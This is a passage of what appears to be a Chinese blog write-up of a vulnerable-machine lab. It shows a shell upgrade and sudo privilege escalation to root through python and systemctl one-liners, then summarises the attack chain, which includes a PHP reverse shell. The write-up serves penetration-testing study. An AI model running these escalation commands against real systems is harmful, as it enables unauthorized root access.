     </code>
    </p>
    <pre><code class="prism language-shell">python3 <span class="token parameter variable">-c</span> <span class="token string">'import pty;pty.spawn("/bin/bash")'</span>
</code></pre>
    <h3>
     <a id="root_510">
     </a>
     提权至root
    </h3>
    <p>
     使用
     <code>
      sudo
     </code>
     可以获取到两个文件， 并且不需要密码
    </p>
    <p>
     <img alt="" src="https://i-blog.csdnimg.cn/img_convert/f1887abdddf87ac8113ffe658aa74c9e.jpeg"/>
    </p>
    <p>
     若是不知道这两个提权方式，可以访问
     <code>
      https://gtfobins.github.io/
     </code>
     查看用法
    </p>
    <pre><code class="prism language-shell"><span class="token function">sudo</span> python <span class="token parameter variable">-c</span> <span class="token string">'import os; os.system("/bin/sh")'</span>
</code></pre>
    <p>
     <img alt="" src="https://i-blog.csdnimg.cn/img_convert/0f9ebec03ac4a50492ae42636044cc4b.jpeg"/>
    </p>
    <p>
     另一个
     <code>
      systemctl
     </code>
     提权，这个提权方式很多，可以通过
     <code>
      .service
     </code>
     文件提权，因为这里没有指定特定的服务，只是这个命令，所以是可以扩展使用的
    </p>
    <p>
     <img alt="" src="https://i-blog.csdnimg.cn/img_convert/69cb57d02646d1117ccd43922b3155f0.jpeg"/>
    </p>
    <pre><code>sudo systemctl
!sh
</code></pre>
    <p>
     <img alt="" src="https://i-blog.csdnimg.cn/img_convert/76e60b4b84df46cf45ab75727b0d2db5.jpeg"/>
    </p>
    <p>
     切换到
     <code>
      /root
     </code>
     目录，查看文件
    </p>
    <p>
     <img alt="" src="https://i-blog.csdnimg.cn/img_convert/5444049721b2c4e12882ae0d5e49fba2.jpeg"/>
    </p>
    <h2>
     <a id="_541">
     </a>
     总结
    </h2>
    <p>
     该靶机考察以下几点：
    </p>
    <ol>
     <li>
      对于网站刚开始访问发现没有任何漏洞的时候，不要就此放弃，可能只是当前没有，不代表在提权时没有用处
     </li>
     <li>
      对于信息收集，要全面，不要遗漏，这个是真的，遗漏一个就需要很长时间
     </li>
     <li>
      对于
      <code>
       ngircd
      </code>
      协议，这个可以了解，至少知道哪些软件可以通过这个协议去连接
     </li>
     <li>
      对于
      <code>
       ssh
      </code>
      服务，其使用证书连接目标时，会有密码需要验证的，这是在生成公私钥的时候设置的
     </li>
     <li>
      对于
      <code>
       sudo -l
      </code>
      ，这个不知道密码的时候，也是可以使用的，因为有的会可以无需密码的
     </li>
     <li>
      对于靶机内的信息收集，也是要全面，这里就是通过发现
      <code>
       apache2
      </code>
      的配置文件具有写权限，所以配合
      <code>
       sudo
      </code>
      的命令，使得靶机重启，让配置文件可以重载
     </li>
     <li>
      通过
      <code>
       php
      </code>
      的反弹
      <code>
       shell
      </code>
      可以获取到
      <code>
       apache2
      </code>
      配置文件中的指定用户
      <code>
       qiu
      </code>
      的
      <code>
       shell
      </code>
     </li>
    </ol>
    <p>
     攻击路线：
    </p>
    <p>
     <code>
      FTP
     </code>
     –&gt;
     <code>
      ngircd
     </code>
     –&gt;
     <code>
      pidgin加入频道
     </code>
     –&gt;
     <code>
      SSH登录
     </code>
     –&gt;
     <code>
      apache2配置文件修改
     </code>
     –&gt;
     <code>
      qiu用户的反弹shell
     </code>
     –&gt;
     <code>
      sudo提权至root
     </code>
    </p>
   </div>
   <link href="../../assets/css/markdown_views-a5d25dd831.css" rel="stylesheet"/>
   <link href="../../assets/css/style-e504d6a974.css" rel="stylesheet"/>
  </div>
 </article>
 <p alt="68747470733a2f2f626c:6f672e6373646e2e6e65742f4368696e615f495f4c4f56452f:61727469636c652f64657461696c732f313436303832313330" class_="artid" style="display:none">
 </p>
</div>


